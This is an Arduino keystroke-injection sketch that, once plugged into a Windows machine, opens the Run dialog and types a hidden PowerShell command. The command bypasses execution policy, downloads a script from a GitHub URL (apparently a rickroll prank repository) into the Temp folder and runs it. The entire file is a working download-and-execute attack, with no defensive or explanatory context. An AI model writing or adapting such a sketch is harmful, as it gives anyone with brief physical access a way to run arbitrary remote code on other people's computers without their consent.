#include <Keyboard.h>
void setup() {
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI); // Press Windows + R
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500); // Wait for run window
  // Type command
  Keyboard.print( 
    "PowerShell.exe -WindowStyle Hidden Set-ExecutionPolicy Bypass -scope Process -Force; & iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/scheduletherickoning.ps1' -o 'C:\\Windows\\Temp\\sch.ps1'; & 'C:\\Windows\\Temp\\sch.ps1'"
  );
  delay(900);
  Keyboard.press(KEY_RETURN); // Press Enter
  Keyboard.release(KEY_RETURN);
}
void loop() {
}
